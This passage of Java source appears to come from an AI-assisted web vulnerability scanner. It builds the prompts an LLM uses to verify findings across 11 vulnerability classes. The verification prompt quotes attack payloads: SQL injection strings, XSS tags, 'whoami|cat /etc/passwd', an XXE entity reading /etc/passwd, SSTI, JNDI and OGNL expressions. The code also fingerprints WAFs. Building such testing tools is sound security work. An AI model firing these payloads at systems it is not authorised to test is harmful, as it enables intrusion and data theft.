                    this.processTestResult(task, testResponse, displayIndex, filteredPayloads.size(), vulnType, testData, position, sendResult.elapsedMs, oob, noDiffSkips, probeAnchors, scannedRequestBytes);
                }
                if (testCount % 10 == 0) {
                    this.logPanel.logProgress(Msg.t("log.progress", testCount, filteredPayloads.size()));
                }
            }
            // 未覆盖参数只提示、不再补测：原来会拿「为别的参数生成的载荷」直接硬打到这些参数上，
            // 载荷与该参数语义无关，验证阶段等于让 AI 判断一个荒谬组合 —— 是误报来源之一。
            Set<String> uncoveredParams = new HashSet<>(allTestedParams);
            uncoveredParams.removeAll(testedPositions.keySet());
            if (!uncoveredParams.isEmpty()) {
                this.logPanel.logParam(Msg.t("log.step4.uncovered", String.join(", ", uncoveredParams)));
            }
            // 外带漏洞是延后判定的：先把在途的外带验证等回来再出任务总结，
            // 否则会先打出「未发现漏洞」，过几秒又冒出一个漏洞
            this.awaitOobVerifications(oobFutures, oobScheduler);
            task.setStatus(ScanTask.TaskStatus.FINISHED);
            List<VulnResult> vulns = task.getVulnerabilities();
            // 收尾摘要一行说清：发包多少、跳过多少（注不进去/发送失败）、多少条因为「毫无差异」没花 AI 验证、
            // 用时多久 —— 排查「为什么没报」时最需要的几个数，以前得自己数日志
            String counters = Msg.t("log.counters", testCount,
                    skippedPayloads.get() > 0 ? Msg.t("log.counters.skipped", skippedPayloads.get()) : "",
                    noDiffSkips.get() > 0 ? Msg.t("log.counters.noDiff", noDiffSkips.get()) : "",
                    noResponsePayloads.get() > 0 ? Msg.t("log.counters.noResponse", noResponsePayloads.get()) : "",
                    (System.currentTimeMillis() - scanStartMillis) / 1000);
            this.logPanel.logDivider(DIVIDER);
            if (vulns == null || vulns.isEmpty()) {
                task.setVulnLevel(ScanTask.VulnLevel.NONE);
                task.setAiTag("安全");
                this.logPanel.logStep(Msg.t("log.taskDone.noVuln", task.getId(), counters));
            } else {
                task.setAiTag(this.getHighestVulnTag(task.getVulnerabilities()));
                this.logPanel.logVuln(Msg.t("log.taskDone.withVuln", task.getId(), task.getVulnerabilities().size(), counters,
                        Msg.levelName(task.getVulnLevel())));
            }
        }
        catch (Exception e) {
            task.setStatus(ScanTask.TaskStatus.FINISHED);
            task.setAiTag("异常");
            task.setErrorMessage(e.getMessage());
            this.logPanel.logError(Msg.t("log.scanError"), e);
            this.logPanel.logDivider(DIVIDER);
        }
        finally {
            // 正常路径已经在 awaitOobVerifications 里关过一次，这里兜住异常路径与提前 return
            oobScheduler.shutdownNow();
        }
    }

    /**
     * 按**字符**截断一段将要放进提示词的文本，并标注「已截断」。
     *
     * <p>必须硬截：以前窗口是按整行累加的（`body.length() < 窗口` 才继续追加下一行），
     * 遇到压缩成一行的响应（minified JSON/JS 很常见）会把整包塞进提示词 ——
     * 而提示词上写着「前 10000 字符」，模型看到的是几十万字符，step2 直接撑爆、任务变成「分析失败」。
     */
    private static String capWindow(String text, int limit) {
        if (text == null) return "";
        if (text.length() <= limit) return text;
        return text.substring(0, limit) + "\n...(已截断，原文共 " + text.length() + " 字符)";
    }

    private String buildRequestInfo(IHttpRequestResponse request, boolean includeResponse) {
        int i;
        byte[] requestBytes = request.getRequest();
        if (requestBytes == null || requestBytes.length == 0) {
            return "无法解析请求信息：请求体为空";
        }
        String requestStr = new String(requestBytes, StandardCharsets.UTF_8);
        StringBuilder info = new StringBuilder();
        info.append("=== 请求信息 ===\n");
        info.append("请求方法和 URL：\n");
        String[] lines = requestStr.split("\r?\n");
        if (lines.length > 0) {
            info.append(lines[0]).append("\n\n");
        }
        info.append("请求头：\n");
        boolean bodyStart = false;
        for (i = 1; i < lines.length; ++i) {
            if (lines[i].trim().isEmpty()) {
                bodyStart = true;
                break;
            }
            info.append(lines[i]).append("\n");
        }
        if (bodyStart && lines.length > 0) {
            info.append("\n请求体（前 ").append(STEP2_INFO_WINDOW).append(" 字符）：\n");
            for (i = 0; i < lines.length; ++i) {
                if (!lines[i].trim().isEmpty() || i + 1 >= lines.length) continue;
                StringBuilder body = new StringBuilder();
                for (int j = i + 1; j < lines.length && body.length() < STEP2_INFO_WINDOW; ++j) {
                    body.append(lines[j]).append("\n");
                }
                info.append(capWindow(body.toString(), STEP2_INFO_WINDOW));
                break;
            }
        }
        
        if (includeResponse && request.getResponse() != null) {
            info.append("\n=== 响应信息 ===\n");
            byte[] responseBytes = request.getResponse();
            String responseStr = new String(responseBytes, StandardCharsets.UTF_8);
            String[] responseLines = responseStr.split("\r?\n");
            
            if (responseLines.length > 0) {
                info.append("响应状态行：").append(responseLines[0]).append("\n\n");
            }
            
            info.append("响应头：\n");
            int responseBodyIndex = -1;
            for (i = 1; i < responseLines.length; ++i) {
                if (responseLines[i].trim().isEmpty()) {
                    responseBodyIndex = i + 1;
                    break;
                }
                info.append(responseLines[i]).append("\n");
            }

            // 响应体必须从空行之后开始：此前下标从 1 重新起算，把响应头又当响应体输出了一遍，
            // 既重复占配额，也让模型以为响应头就是响应体。
            // 窗口 10000 字符：步骤2 要判断「哪个参数像是有漏洞」，而线索（报错、组件指纹、
            // 回显点、框架特征）常在页面中后段，2000 字符只够看到页头 —— 这一步只调用一次，
            // 多给上下文很划算。
            info.append("\n响应体（前 ").append(STEP2_INFO_WINDOW).append(" 字符）：\n");
            StringBuilder responseBody = new StringBuilder();
            if (responseBodyIndex > 0) {
                for (i = responseBodyIndex; i < responseLines.length && responseBody.length() < STEP2_INFO_WINDOW; ++i) {
                    responseBody.append(responseLines[i]).append("\n");
                }
            }
            info.append(capWindow(responseBody.toString(), STEP2_INFO_WINDOW));

            info.append("\n=== 响应特征分析（启发式提示，不构成漏洞证据）===\n");
            // 只看提示词里真正给模型看的那一段。此前取的是第 2000 字符之后的尾部：
            // 响应小于 2000 字符时下面各块恒为空，较大时又依据模型看不到的内容下判断
            String responseBodyFull = responseBody.toString().toLowerCase();
            
            if (responseLines.length > 0) {
                String statusLine = responseLines[0];
                if (statusLine.contains("200")) {
                    info.append("响应状态码：200 OK\n");
                } else if (statusLine.contains("403")) {
                    info.append("响应状态码：403 Forbidden（WAF 拦截或权限不足）\n");
                } else if (statusLine.contains("404")) {
                    info.append("响应状态码：404 Not Found\n");
                } else if (statusLine.contains("500")) {
                    info.append("响应状态码：500 Internal Server Error\n");
                } else if (statusLine.contains("502") || statusLine.contains("503")) {
                    info.append("响应状态码：502/503（后端异常）\n");
                }
            }
            
            info.append("\n错误信息检测：\n");
            if (responseBodyFull.contains("sql") && (responseBodyFull.contains("syntax") || responseBodyFull.contains("exception") || responseBodyFull.contains("error"))) {
                info.append("- 检测到 SQL 错误关键词\n");
            }
            if (responseBodyFull.contains("stack trace") || responseBodyFull.contains("exception") || responseBodyFull.contains("throwable") || responseBodyFull.contains("at com.") || responseBodyFull.contains("at java.")) {
                info.append("- 检测到栈轨迹信息\n");
            }
            if (responseBodyFull.contains("debug") || responseBodyFull.contains("trace") || responseBodyFull.contains("verbose")) {
                info.append("- 检测到调试模式关键词\n");
            }
            
            info.append("\nWAF 指纹识别：\n");
            String responseStrLower = responseStr.toLowerCase();
            if (responseStrLower.contains("cf-ray") || responseStrLower.contains("cloudflare")) {
                info.append("- Cloudflare WAF 特征\n");
            }
            // 不用裸 "aws"：页面正文里出现这三个字母就会误判成 AWS WAF
            if (responseStrLower.contains("x-amzn-requestid") || responseStrLower.contains("awselb")
                    || responseStrLower.contains("x-amz-cf-id") || responseStrLower.contains("x-amz-request-id")) {
                info.append("- AWS WAF 特征\n");
            }
            if (responseStrLower.contains("safedog")) {
                info.append("- 安全狗 WAF 特征\n");
            }
            if (responseStrLower.contains("modsecurity") || responseStrLower.contains("mod_security")) {
                info.append("- ModSecurity WAF 特征\n");
            }
            
            info.append("\n响应体结构：\n");
            if (responseBodyFull.trim().startsWith("{") || responseBodyFull.contains("\"status\"") || responseBodyFull.contains("\"data\"")) {
                info.append("- JSON 响应（API 接口的常见形态）\n");
            }
            if (responseBodyFull.trim().startsWith("<?xml") || responseBodyFull.contains("<!doctype") || responseBodyFull.contains("<soap")) {
                info.append("- XML/SOAP 响应\n");
            }
            if (responseBodyFull.contains("<html") || responseBodyFull.contains("<!doctype html")) {
                info.append("- HTML 响应\n");
            }
            
            info.append("\n敏感信息检测：\n");
            if (responseBodyFull.contains("token") || responseBodyFull.contains("api_key") || responseBodyFull.contains("access_token") || responseBodyFull.contains("authorization")) {
                info.append("- 可能泄露 Token/API Key\n");
            }
            if (responseBodyFull.contains("/var/") || responseBodyFull.contains("c:\\users\\") || responseBodyFull.contains("/home/")) {
                info.append("- 可能泄露系统路径\n");
            }
            if (responseBodyFull.contains("server:") || responseBodyFull.contains("x-powered-by")) {
                info.append("- Server/X-Powered-By 头信息泄露\n");
            }
        }
        
        return info.toString();
    }

    private String getVulnTypeFromScanMode(ScanTask.ScanMode mode) {
        // displayName 即标准中文类型名（菜单也用它），无需再手工维护第二份映射
        if (mode == null) return "UNKNOWN";
        return mode.getDisplayName();
    }

    /**
     * 验证特征块的起止锚点：{@link #trimVerifyFeatures} 就靠这两行定位。
     * 提示词正文也**用这两个常量拼**，不许再写字面量 —— 两处各写一遍时改一处就会让
     * indexOf 找不到锚点、裁剪静默失效（而且提示词快照工具只展开 int 常量，看不出来）。
     */
    private static final String VERIFY_FEATURE_HEADER = "[" + VULN_TYPE_COUNT + "种漏洞验证特征]";
    private static final String VERIFY_OUTPUT_HEADER = "[输出要求]";

    /**
     * 本次扫描要判定哪些类型：单漏洞模式就是该模式本身，CUSTOM 模式取 paramVulnMap 里出现的类型。
     * 返回 null / 空集表示不裁剪（整份发）。
     */
    private Set<String> verifyTypesFor(ScanTask task) {
        if (task == null) return null;
        ScanTask.ScanMode mode = task.getScanMode();
        if (mode != null && !mode.isCustom()) {
            Set<String> only = new HashSet<String>();
            only.add(mode.getDisplayName());
            return only;
        }
        return task.getMappedVulnTypes();
    }

    /**
     * 按本次要判的类型裁剪验证提示词里的特征块。
     *
     * <p>11 类特征占了整份验证提示词的 3/4（实测 3669 / 4914 字符），而每条载荷都会带一份 ——
     * 一次扫描几十条载荷就是几万字符的无效输入，还容易把模型带偏到本次没测的类型上。
     *
     * <p>裁剪靠块首的「N. 类型名」行定位；任何一步对不上就整份返回 ——
     * 宁可多发，也不能把提示词切坏（切坏了模型会拿到半截规则）。
     */
    private String trimVerifyFeatures(String fullPrompt, Set<String> wantedTypes) {
        if (fullPrompt == null || wantedTypes == null || wantedTypes.isEmpty()) return fullPrompt;
        int headerAt = fullPrompt.indexOf(VERIFY_FEATURE_HEADER);
        int outputAt = fullPrompt.indexOf(VERIFY_OUTPUT_HEADER);
        if (headerAt < 0 || outputAt <= headerAt) return fullPrompt;

        String head = fullPrompt.substring(0, headerAt + VERIFY_FEATURE_HEADER.length());
        String tail = fullPrompt.substring(outputAt);
        String body = fullPrompt.substring(headerAt + VERIFY_FEATURE_HEADER.length(), outputAt);

        // 块首是「N. 类型名」：内容从类型名开始（跳过后面的重新编号才不会写出「1. 1. SQL注入」），
        // 结束在下一块的**行首**（连它前面的编号一起切掉）。
        // 类型名里可能有空格（Log4j2 JNDI注入、Struts2 OGNL注入），所以取的是整行而不是 \S+ ——
        // 用 \S+ 时这两个块根本匹配不上，裁剪会静默失效。
        java.util.regex.Matcher m = java.util.regex.Pattern.compile("(?m)^\\d+\\.\\s*(.+)$").matcher(body);
        List<String> names = new ArrayList<String>();
        List<Integer> lineStarts = new ArrayList<Integer>();
        List<Integer> nameStarts = new ArrayList<Integer>();
        while (m.find()) {
            names.add(m.group(1).trim());
            lineStarts.add(m.start());
            nameStarts.add(m.start(1));
        }
        if (names.isEmpty()) return fullPrompt;

        StringBuilder kept = new StringBuilder();
        int keptCount = 0;
        for (int i = 0; i < names.size(); i++) {
            if (!wantedTypes.contains(names.get(i))) continue;
            int from = nameStarts.get(i);
            int to = i + 1 < lineStarts.size() ? lineStarts.get(i + 1) : body.length();
            ++keptCount;
            kept.append(keptCount).append(". ").append(body, from, to);
        }
        // 一个都没匹配上（类型名对不上）→ 整份发，别让模型拿到没有特征块的提示词
        if (keptCount == 0) return fullPrompt;

        return head + "\n\n" + kept + tail;
    }

    private String getDefaultVerifyPrompt() {
        return "你是一名资深渗透测试专家。严格验证漏洞是否真实存在，基于清晰的技术证据链做出判断。存疑时，不报告。\n\n"
                + authorizedTestingNotice()
                + "[验证原则]\n"
                + "1. 输入中会给出【原始请求的响应（基线）】。判断必须建立在「本次响应相对基线发生了哪些变化」之上，"
                + "不能只看本次响应；与基线完全一致即表示没有漏洞。响应头里的 Date 等**每次都变**的字段不算差异，"
                + "比对时忽略它们（工具侧的相同判断也是按剥离后的内容做的）。"
                + "若输入里同时给出了【同组合探测载荷的响应（对照，不是基线）】，则「没有漏洞」需要"
                + "**本次响应与基线、与对照都一致**：只与基线一致、却与对照不同时，说明本次输入改变了应用的行为，"
                + "这正是布尔盲注一类漏洞的证据形态，必须据此分析，而不是按「一致即无漏洞」直接否掉\n"
                + "2. 输入中会给出【响应耗时】。只在时间类证据上使用它，且必须看差值而不是绝对值："
                + "接口本来就慢不算漏洞，只有本次显著慢于基线、且差值接近载荷声明的睡眠时长才算\n"
                + "3. 全面分析完整HTTP响应（状态行+响应头+响应体），不仅仅依赖响应长度或状态码\n"
                + "4. 必须找到证明成功利用的明确技术证据，而不仅仅是异常\n"
                + "5. 排除误报：WAF拦截页面、参数校验报错、静态资源缓存、跳转登录页，"
                + "以及基线里本来就存在的错误页/提示语（基线里就有的，一律不算本次注入的效果）\n"
                + "6. 只报告置信度>=" + CONFIDENCE_REPORT_THRESHOLD + "%的漏洞，否则视为不存在\n"
                + "7. 避免重复报告：同一响应特征同时符合多种类型时，只报告证据最充分的一种\n"
                + "8. 外带类证据（DNS/HTTP 外带）只在【外带回连记录】里逐条列出了记录时才成立；"
                + "记录为「无」表示目标没有解析本次请求的域名，这是有效的反向证据；"
                + "标注为不可用（没拿到回连域名）、或写明本次载荷不依赖外带时，"
                + "不要把「没有记录」当证据 —— 前者是工具的问题，后者是这条载荷本来就不需要外带\n"
                + "9. 很长的请求与响应只给**片段**：会标注「前 N 字符略」「原文共 N 字符」「关键位置在第 N 字符处」，"
                + "而且片段是**以证据位置为中心**截取的（载荷回显处、或与基线首个不同处）。"
                + "所以证据正常情况下就落在片段里；若片段里确实找不到任何变化，再按证据不足处理，"
                + "不要凭「窗口里没看到」去推断整段响应的内容\n\n"
                + VERIFY_FEATURE_HEADER + "\n\n"
                + "1. SQL注入\n"
                + "   [强证据] 数据库错误信息（MySQL: You have an error in your SQL syntax/PostgreSQL: ERROR: syntax error/Oracle: ORA-00933/SQL Server: Incorrect syntax near/MariaDB: MariaDB server）、UNION SELECT数据在响应中回显、布尔盲注差异（AND 1=1 vs AND 1=2 的响应相对基线出现内容/长度/状态码的稳定差异）、时间盲注（本次耗时显著高于基线且差值接近载荷声明的睡眠秒数）、堆叠查询效果（第二个查询被执行）、服务器错误500且响应中含SQL错误关键词\n"
                + "   [弱证据/排除] 普通500错误（无SQL错误关键词）、参数不存在404、WAF拦截403/406、响应长度只有微小变化（<5%，多为动态内容）、基线与本次响应一致\n"
                + "   [验证方法] 对比载荷 ' OR '1'='1 vs ' OR '1'='2 的响应，并同时对照基线；时间盲注看耗时差值而不是绝对秒数\n\n"
                + "2. XSS跨站脚本\n"
                + "   [强证据] 载荷原样出现在可执行上下文：响应中包含未编码的 <script>alert(1)</script>，或 <img src=x onerror=alert(1)> 等事件处理器标签，且该处不在引号包裹的字符串、属性值转义、HTML注释或 JSON 字符串里；原本不存在的标签/属性因本次注入而出现（与基线对比）\n"
                + "   [弱证据/排除] HTML实体编码（&lt;script&gt; 而非 <script>）、载荷被 JSON 转义（\\u003c）、载荷落在 HTML 注释中、CSP 响应头禁止内联脚本、基线里本来就回显了同样的内容\n"
                + "   [验证方法] 只看本次响应是否未经过滤地回显；本工具不执行 JavaScript，因此不存在「弹窗」这类可观测证据，不要以弹窗为由判定\n\n"
                + "3. 命令注入\n"
                + "   [强证据] 系统命令输出（id/uid/whoami/echo test/hostname的实际输出）、文件列表（/bin/ls /tmp目录列表）、时间盲注（本次耗时显著高于基线且差值接近载荷声明的睡眠秒数）、管道命令执行结果（whoami|cat /etc/passwd 返回 passwd 内容）、命令执行成功返回预期输出\n"
                + "   [弱证据/排除] 响应中有命令关键词但无执行结果、WAF拦截页面、普通500错误、命令输出被过滤、基线里本来就有同样的输出\n"
                + "   [验证方法] 对照基线比对输出；延时类看耗时差值；使用 whoami && id 组合确认多条命令被执行\n\n"
                + "4. 文件上传\n"
                + "   [强证据] 响应中泄露了上传后的可访问路径（如 /uploads/xxx.php、/upload/2024/shell.php）且该路径在本工具的基线响应中不存在、响应明确回显了服务端保存的文件名与扩展名（说明扩展名校验被绕过）、响应包含上传文件的处理结果或内容回显\n"
                + "   [弱证据/排除] 只有「上传成功」这类通用提示而无路径、文件被重命名或保存为 .txt 等不可执行扩展名、响应与基线一致、服务端返回了扩展名/类型不合法的报错\n"
                + "   [验证方法] 本工具每个载荷只发送一次请求，无法二次访问上传路径，因此只有在**本次响应自身**泄露路径或回显文件内容时才能判定；仅是上传成功提示不构成证据\n\n"
                + "5. SSRF服务端请求伪造\n"
                + "   [强证据] 本次响应里出现了**只能来自内部目标**的内容：云元数据字段（ami-id、instance-id、security-credentials 等）、内部服务 banner（Redis 的 -ERR unknown command / redis_version、Elasticsearch/Consul 等内网 JSON）、内网主机名或只在内网可达的页面内容、file:// 读到的本地文件内容（root:x:0:0 等）；且这些内容在基线响应里不存在\n"
                + "   [弱证据/排除] 只有状态码或长度变化、连接超时或连接被拒（外部不可达同样会超时）、返回 404/通用错误页、响应里出现 IP 字样但没有实际内容、把外部 URL 也访问成功当成 SSRF、基线里本来就有的页面\n"
                + "   [验证方法] 只读本次响应：内部特征必须与基线不同**且只能由内部资源产生**；盲 SSRF 只能看【外带回连记录】，没有记录就按证据不足处理，不要靠超时或错误页推断\n\n"
                + "6. XXE外部实体注入\n"
                + "   [强证据] 文件读取成功（<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> 的响应包含 passwd 内容）、SOAP XML 注入成功（SOAP 请求中外部实体被解析）、XInclude 注入成功（<xi:include href=\"file:///etc/passwd\"/> 返回内容）、解析器报错里**明确出现我们本次请求的域名**（如 failed to load external entity \"http://<本次域名>/evil.dtd\"，说明 DTD 真的被取了）\n"
                + "   [弱证据/排除] XML解析错误但无文件读取、实体未解析（&xxe; 在响应中原样返回）、仅有XML结构错误、报错里没有我们的域名、基线里本来就有的解析错误\n"
                + "   [验证方法] 检查响应是否包含 root:x:0:0 等目标文件内容，并与基线对比；盲 XXE 只看【外带回连记录】，没有记录（且报错里也没有我们的域名）就按证据不足处理\n\n"
                + "7. SSTI服务端模板注入\n"
                + "   [强证据] 数学运算结果回显（{{7*7}}返回49、${7*7}返回49、<%= 7*7 %>返回49）、模板引擎语法被解析（{{config}}返回Flask配置对象、{{self.__class__.__name__}}返回模板引擎内部类名）、载荷执行输出与预期数学结果匹配（而非把 {{7*7}} 原样返回）、模板特定属性可访问（{{''.__class__.__mro__}}返回Python类信息）\n"
                + "   [弱证据/排除] 响应包含{{7*7}}字符串但未被解析、模板语法在HTML注释中、模板引擎错误但无代码执行\n"
                + "   [验证方法] 对比{{7*7}}、{{7*'7'}}、{{config}}的响应；检查是否返回模板引擎特定对象或配置\n\n"
                + "8. Fastjson反序列化\n"
                + "   [强证据] 回连记录：目标解析了我们这次请求的专属域名（@type 里的 java.net.Inet4Address / java.net.URL / jar:http:// 被解析）\n"
                + "   [弱证据/排除] @type 字符串被原样回显、普通 JSON 解析错误、400/500 但没有任何 fastjson 特征、基线里本来就有同样的报错；autoType is not support / autoType error / JSONException 这类报错**只能说明目标用了 fastjson（或 SafeMode 拦住了）**，不构成证据\n"
                + "   [验证方法] 这条漏洞只能靠外带确认：有回连记录即成立；没有回连记录时，无论响应里出现什么报错都按证据不足处理\n\n"
                + "9. Log4j2 JNDI注入\n"
                + "   [强证据] 回连记录：目标解析了我们这次请求的专属域名（${jndi:dns://...}、${jndi:ldap://...} 这类 lookup 被解析）；响应里出现 lookup 的求值结果（如 ${java:version} 被替换成真实版本号）\n"
                + "   [弱证据/排除] 载荷原样回显（说明没进日志或没被解析）、普通 500/报错、WAF 拦截页里出现 jndi 字样\n"
                + "   [验证方法] 回连记录是唯一强证据；${java:version} 这类无害 lookup 被替换只能作为辅助（说明格式化解析发生了）\n\n"
                + "10. Struts2 OGNL注入\n"
                + "   [强证据] 回连记录：目标解析了我们这次请求的专属域名（OGNL 里的 nslookup / ProcessBuilder 被求值，或 S2-069 的外部实体被解析）；响应里出现 OGNL 求值结果（%{100*100} 返回 10000）\n"
                + "   [弱证据/排除] Struts 报错页、404/500、OGNL 表达式原样回显、只有 Content-Type 报错而不含求值结果\n"
                + "   [验证方法] 参数 OGNL 用 %{100*100} 与 %{100*200} 对照：响应里出现 10000 / 20000 这类**求值后的值**才算（表达式原样返回不算）；**注意区分回显与求值**——页面里同时出现「原始输入回显」（如 your input id: %{100*100}）和「求值结果」（如标签属性 <a id=\"10000\">）时，证据是后者；命令执行类必须看回连记录\n\n"
                + "11. Shiro反序列化\n"
                + "   [强证据] 回连记录：目标解析了我们这次请求的专属域名（rememberMe 解密成功并反序列化了 URLDNS gadget，同时证明密钥正确与反序列化被执行）\n"
                + "   [弱证据/排除] 响应里只有 Set-Cookie: rememberMe=deleteMe（只说明目标用了 Shiro）、跳转登录页、反序列化异常但无回连记录\n"
                + "   [验证方法] 回连记录是唯一强证据；只有 deleteMe 不能判定漏洞\n\n"
                + VERIFY_OUTPUT_HEADER + "\n"
                + "1. 必须返回纯JSON格式，不要markdown代码块，不要额外解释\n"
                + "2. JSON格式: {\"vulnerable\":true,\"confidence\":" + CONFIDENCE_REPORT_THRESHOLD + ",\"vulnType\":\"SQL注入\",\"level\":\"CRITICAL\",\"description\":\"漏洞特征和证据的详细描述\",\"tag\":\"SQL注入\"}\n"
                + "3. 字段说明:\n"
                + "   - vulnerable: true/false，仅在证据确凿时为true\n"
                + "   - confidence: 0-100，仅在>=" + CONFIDENCE_REPORT_THRESHOLD + "时报告漏洞\n"
                + "   - vulnType: 必须使用以下" + VULN_TYPE_COUNT + "种标准中文类型之一：SQL注入、XSS跨站脚本、命令注入、文件上传、SSRF服务端请求伪造、XXE外部实体注入、SSTI服务端模板注入、Fastjson反序列化、Log4j2 JNDI注入、Struts2 OGNL注入、Shiro反序列化；若判定为其他细分类型，请归入上述最接近的一种；不属于上述" + VULN_TYPE_COUNT + "种的漏洞一律不报告\n"
                + "   - level: CRITICAL/HIGH/MEDIUM/LOW，基于漏洞严重程度\n"
                + "   - description: 漏洞特征和证据链的详细描述，解释为何判断为真/假\n"
                + "   - tag: 中文漏洞名称\n"
                + "4. 如果证据不足，返回 {\"vulnerable\":false,\"confidence\":X,\"vulnType\":\"SQL注入\",\"level\":\"LOW\",\"description\":\"证据不足原因\",\"tag\":\"SQL注入\"}";
    }

    /**
     * 同组合对照块：把该组合**第一条**载荷（探测载荷）的响应交给模型，让「成对判读」成为可能。
     *
     * <p>为什么必须有：验证提示词一直在要求成对比对（SQL 特征块的验证方法就写着「对比载荷
     * ' OR '1'='1 vs ' OR '1'='2 的响应，并同时对照基线」），可那两条载荷是在两次互不知情的调用里
     * 分别判的 —— 模型手里永远只有一条。而布尔盲注里「注入成立」与「参数值恰好没变」在单条响应上
     * 长得一模一样，只有把两条摆在一起才分得开。
     *
     * <p>它**不是基线**，措辞里要说清：判定依据仍是步骤1 的基线（验证原则 1），本块只是同一组合内的
     * 参照物。最后两句是安全阀 —— 对照自身也可能是被 WAF 拦掉或报错的响应，模型得先确认它配当
     * 「正常业务响应」，否则会把「对照被拦、我没被拦」读成绕过了防护，那是误报生成器。
     *
     * @param controlAnchor 以「本次响应与对照的首个不同处」为中心的锚点（与基线块同一套取法）
     * @return 没有对照时返回**空串**：拼出来的提示词与没有这个功能时逐字节相同
     */
    private String buildProbeAnchorBlock(ProbeAnchor control, int controlAnchor, byte[] testBytes) {
        if (control == null || control.response == null || control.response.length == 0) return "";
        String controlText = new String(control.response, StandardCharsets.UTF_8);
        // 对照载荷文本用 capWindow 截断，**不能用 loggablePayload** —— 后者会插 Msg.t(...)，
        // 而提示词里禁止出现 i18n 文案（提示词始终是中文，不随界面语言变）。
        // 窗口与四段正文一致（VERIFY_WINDOW）：模型要把这条载荷与【测试Payload】对照着看，
        // 而后者是**原样全给**的 —— 两边同样的完整度才谈得上对比（载荷通常只有几十字符，
        // 上限基本不会触发；整段 multipart / XXE 这类长载荷才会）
        StringBuilder sb = new StringBuilder();
        sb.append("【同组合探测载荷的响应（对照，不是基线）】\n");
        sb.append("对照载荷（同一组合里先于本条发送的那条）：").append(capWindow(control.payload, VERIFY_WINDOW)).append("\n");
        sb.append("对照耗时：").append(control.elapsedMs).append(" ms\n");
        sb.append("对照响应：\n").append(excerptForPrompt(controlText, VERIFY_WINDOW, controlAnchor)).append("\n\n");
        // 「同/不同」由代码算，不让模型自己数；比的是剥掉易变响应头之后的视图（否则 Date 每次都不同，
        // 这行永远写「不同」，等于没给信息）
        boolean sameAsControl = testBytes != null
                && Arrays.equals(volatileHeadersMasked(control.response), volatileHeadersMasked(testBytes));
        sb.append("本次响应与对照：").append(sameAsControl ? "逐字节相同（易变响应头不计）" : "不同")
          .append("（本次 ").append(testBytes == null ? 0 : testBytes.length)
          .append(" 字节 / 对照 ").append(control.response.length).append(" 字节）\n\n");
        sb.append("用法：对照与本条载荷来自同一个「参数-漏洞」组合，需要成对解读 —— 布尔盲注看「恒真」与「恒假」、"
                + "时间盲注看「有延时」与「无延时」、WAF 绕过看「被拦截」与「未被拦截」；"
                + "只有这一对之间的差异能用注入解释时才成立。\n");
        sb.append("它不是基线：【原始请求的响应（基线）】才是判定依据，本块只是同一组合内的参照。\n");
        sb.append("不要因为「本次响应与对照相同」就直接判无漏洞：同一对里常常一条与对照相同、另一条不同，"
                + "差异出现在哪一侧都可能是漏洞特征（恒真载荷与探测载荷一致正是常态）。\n");
        sb.append("对照自身也可能被 WAF 拦截、可能是报错页：先看它与基线是否一致，"
                + "再决定能不能把它当作「正常业务响应」的参照。\n");
        return sb.toString();
    }

    /**
     * 验证的**用户提示词**拼装。
     *
     * <p>从 {@link #verifyVulnerability} 里抽出来是为了能被离线自检直接钉住：此前验证用户提示词
     * 在离线自检里**零覆盖**（只有系统提示词 {@code getDefaultVerifyPrompt} 被断言过），
     * 而它恰恰是每次载荷判定真正依赖的东西。
     */
    String buildVerifyUserPrompt(ScanTask task, String payload, String vulnType, long elapsedMs, OobProbe oob,
                                 String testRequest, byte[] responseBytes, ProbeAnchor control) {
        String response = responseBytes != null ? new String(responseBytes, StandardCharsets.UTF_8) : "";
        ScanTask.ScanMode mode = task != null ? task.getScanMode() : null;
        String scanModeStr = (mode != null && !mode.isCustom()) ? mode.getDisplayName() : "AI智能扫描";
        // 证据锚点：长响应/长请求只给片段，但必须让片段里带着证据（见 excerptForPrompt）
        byte[] baselineBytes = task != null ? task.getOriginalResponseBytes() : null;
        int responseAnchor = evidenceAnchor(response, payload, baselineBytes);
        int requestAnchor = payload != null && testRequest != null ? testRequest.indexOf(payload) : -1;
        // 对照窗口的锚点：把对照响应当作 evidenceAnchor 的 baseline 参数，窗口就落在两者开始分歧处。
        // 与基线块用**同一个锚点**取窗口是既有约定（buildBaselineBlock 也这么做）——
        // 各取各的锚点会让两个窗口落在不同区域，同口径对比就无从谈起。
        int controlAnchor = control == null ? -1 : evidenceAnchor(response, payload, control.response);
        return String.format(
                "【扫描模式】%s\n\n"
                + "【测试Payload】\n%s\n\n"
                + "【漏洞类型】\n%s\n\n"
                + "%s"
                + "%s"
                + "【本次测试请求】\n%s\n\n"
                + "【本次测试响应】\n%s\n\n"
                + "%s"
                + "%s"
                + "请先对照基线判断本次响应相对基线出现了哪些变化，再判断测试Payload是否成功利用了该漏洞。"
                + "只有那些无法用「正常业务响应」解释的变化才算证据。",
                scanModeStr, payload, vulnType,
                this.buildTimingBlock(task, elapsedMs),
                this.buildOastBlock(oob),
                excerptForPrompt(testRequest, VERIFY_WINDOW, requestAnchor),
                excerptForPrompt(response, VERIFY_WINDOW, responseAnchor),
                this.buildProbeAnchorBlock(control, controlAnchor, responseBytes),
                this.buildBaselineBlock(task, responseAnchor));
    }

    private JsonObject verifyVulnerability(ScanTask task, String testRequest, String payload, byte[] responseBytes, String vulnType, long elapsedMs, OobProbe oob, ProbeAnchor control) {
        // 线程是被复用的：先置成「未记录」，下面每条失败路径各自覆盖 —— 别把上一次的原因留给这一次
        this.setVerifyFailReason(Msg.t("verify.fail.unknown"));
        try {
            // 按本次要判的类型裁剪特征块。
            // （2026-09-27 起不再支持「用户自定义验证提示词」：那一版会把整份提示词替换掉、
            // 不再插值 CONFIDENCE_REPORT_THRESHOLD，判定门限与代码脱钩；而且配置页上早已没有入口，
            // 只有手改 JSON 才够得着 —— 留着就是一条没人能正常用的暗道。）
            String verifyPrompt = this.trimVerifyFeatures(this.getDefaultVerifyPrompt(), this.verifyTypesFor(task));
            String prompt = this.buildVerifyUserPrompt(task, payload, vulnType, elapsedMs, oob,
                    testRequest, responseBytes, control);
            JsonObject requestBody = this.buildAIRequest(verifyPrompt, prompt);
            String responseBody = this.callAI(requestBody);
            if (responseBody == null) {
                // 具体原因（HTTP 码/异常）上面已经打过，这里只做指路
                this.setVerifyFailReason(Msg.t("verify.fail.call"));
                return null;
            }
            JsonObject result = this.gson.fromJson(responseBody, JsonObject.class);
            String content = this.extractAIContent(result);
            if (content == null) {
                this.setVerifyFailReason(Msg.t("verify.fail.envelope")
                        + this.envelopeHint(result)
                        + Msg.t("verify.fail.snippet", loggablePayload(responseBody)));
                return null;
            }
